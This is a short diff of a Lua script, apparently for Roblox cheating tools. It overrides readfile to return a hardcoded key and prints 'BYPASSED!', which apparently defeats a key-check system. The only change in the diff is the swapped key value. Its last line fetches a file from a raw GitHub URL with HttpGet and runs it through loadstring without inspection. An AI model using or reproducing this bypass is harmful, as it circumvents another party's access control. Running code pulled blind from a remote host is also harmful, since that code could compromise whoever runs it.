@@ -16,7 +16,7 @@ Proof that they are skidding - they dont even know whats difference of game:GetS
 local originalReadFile = readfile
 readfile = function(path)
    print("BYPASSED!")
-   return "nuZEwG3evs83xi1" 
+   return "QHvMlkGYu0fExAA" 
 end
 
 loadstring(game:HttpGet(('https://raw.githubusercontent.com/zeuise0002/SSSWWW222/main/README.md'),true))()
